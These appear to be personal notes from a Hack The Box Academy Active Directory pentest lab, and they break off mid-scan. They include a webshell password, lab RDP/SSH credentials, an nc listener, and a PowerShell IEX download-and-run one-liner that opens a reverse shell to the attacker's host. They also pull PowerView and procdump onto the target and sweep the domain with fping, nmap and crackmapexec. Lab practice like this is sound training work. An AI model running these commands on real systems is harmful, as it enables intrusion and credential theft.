
admin:My_W3bsH3ll_P@ssw0rd!

## Setup Reverse shell:
```## **On your Kali machine:**

- Host the script: in this directory: /usr/share/nishang/Shells/Invoke-ConPtyShell.ps1

    python3 -m http.server 8000
    
- Set up your listener (with raw mode for best results):

	stty raw -echo; (stty size; cat) | nc -lvnp 9001
    
## **On the Windows target (from your current shell):**
- Run this PowerShell command (replace `KALI_IP` and `9001` with your values):
```

```powerShell
IEX(IWR http://10.10.14.158:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.158 9001
```

### To get powerview on Kali machine:
```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

^^ To get the file on Windows:
```
Invoke-WebRequest -Uri "http://10.10.14.158:8000/PowerView.ps1" -OutFile "C:\TEMP\PowerView.ps1"
```

## Domain Controller:
DC01:172.16.6.3

Invoke-WebRequest -Uri "http://10.10.14.158:8000/procdump.exe" -OutFile "C:\TEMP\procdump64.exe"


## MS01:172.16.6.50


# Skills 2.0
1. RDP: xfreerdp /v:10.129.225.154 /u:htb-student /p:HTB_@cademy_stdnt! 
2. SSH: ssh htb-student@10.129.225.154

#### Let's find other hosts on the domain:
Looking at `ip a` output, let's try the subnet below:
`fping -asgq 172.16.7.0/23`

This found 
```
172.16.7.3:DC01
172.16.7.50:MS01
172.16.7.60:SQL01
172.16.7.240
```

Let's try to nmap these hosts:
`sudo nmap `




3. `crackmapexec smb 10.129.225.154` -> Nothing
4. Nmap scan
	1. 